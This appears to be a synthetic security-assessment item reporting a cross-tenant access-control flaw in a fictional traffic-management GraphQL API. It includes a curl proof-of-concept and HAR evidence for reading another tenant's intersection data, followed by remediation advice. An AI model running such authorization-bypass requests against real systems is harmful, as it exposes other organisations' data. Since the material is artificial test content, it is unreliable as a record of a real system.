# Security Analysis Report
**System:** MetroPulse Traffic Orchestration — v4.4.0 (FINAL)
**Domain:** Smart City / Traffic Management
**Example ID:** GQL-0254
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `getIntersection` — attacker reads any traffic intersection record across tenants |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Intersection Lookup (Pattern 3.1)

### Summary
The `getIntersection` GraphQL resolver on MetroPulse Traffic Orchestration (`api.metropulse-traffic-o.example.com`) fetches by `nodeId` without verifying that the returned record's `tenantId` matches the JWT's `tenantId`. Per §5.0 Pattern 3.1, the design assumes the client will only query nodes it is authorised to access — no server-side tenant re-validation occurs after the database fetch. An attacker authenticated to `tenant-f085` queries intersection `I-2254` belonging to `tenant-f712` and receives full traffic node data. In a smart city / traffic management context, intersection records may contain signal timing configurations, incident logs, sensor data, and infrastructure-sensitive internalNotes.

**Context artifact note:** §5.0 describes Pattern 3.1 as "client supplies price, role, or status fields that the resolver applies without re-validation" — however the HAR demonstrates it as a read operation where the client-assumed authority is "I am allowed to query any node ID I supply." Both are manifestations of Pattern 3.1; the specific HAR evidence is used for reproduction.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected resolver:** `getIntersection(id: ID!)`
**Affected endpoint:** `POST https://api.metropulse-traffic-o.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.metropulse-traffic-o.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-f085
Content-Type: application/json

{"query": "query VulnerableOp { getIntersection(id: \"I-2254\") { nodeId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Victim Intersection Data Returned**
```json
{
  "data": {
    "getIntersection": {
      "tenantId": "tenant-f712",
      "ownerId": "other-user-f085f712",
      "data": {
        "sensitiveField": "CONFIDENTIAL-f085f712",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Note: `x-request-id: req-f085f712` is a server-assigned **response** header (§6.0 response.headers). It is not part of the attack request.

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `nodeId` only — no tenant dimension |
| §3.0 Schema | `getIntersection(id: ID!)` — no tenant argument or ownership scope |
| §4.0 RISK-GQL-254 | Resolver fetches by `nodeId` only; no tenancy check documented |
| §5.0 Pattern 3.1 | Client-assumed authority — resolver trusts that client-supplied ID is authorised |
| HAR request | Attacker `tenant-f085` supplies `id: "I-2254"` belonging to `tenant-f712` |
| HAR `x-tenant-id` | `tenant-f085` — attacker's tenant, mismatches response `tenantId: tenant-f712` |
| HAR response | `CONFIDENTIAL-f085f712` and `internalNotes` from victim intersection returned |

---

## Steps to Reproduce

```bash
# Authenticate as attacker (tenant-f085)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Query victim intersection I-2254 (owned by tenant-f712)
# x-request-id is server-assigned and appears in the response only; not sent in the request
curl -s -X POST https://api.metropulse-traffic-o.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-f085" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { getIntersection(id: \"I-2254\") { nodeId tenantId ownerId data { sensitiveField internalNotes } } }"}'

# Expected (vulnerable): tenantId: "tenant-f712", sensitiveField: "CONFIDENTIAL-f085f712"
# Expected (secure): HTTP 403 or { "errors": [{ "message": "Forbidden" }], "data": { "getIntersection": null } }
```

---

## Remediation

1. **Resolver ownership check:** After fetching `I-2254`, assert `record.tenantId === $jwt.tenantId`; return FORBIDDEN if mismatch.
2. **Database WHERE clause:** `WHERE node_id = $id AND tenant_id = $jwtTenantId` — never rely solely on post-fetch assertion.
3. **Cache keying:** Include `tenantId` in Redis key: `intersection:{tenantId}:{nodeId}`.
4. **Batch endpoint hardening:** `bulkIntersectionLookup(ids: [ID!]!)` (§3.0) must also filter results to the JWT tenant before returning.
5. **Smart city note:** Traffic intersection configurations are safety-critical; unauthorized read access could expose signal timing data usable for physical traffic disruption attacks.
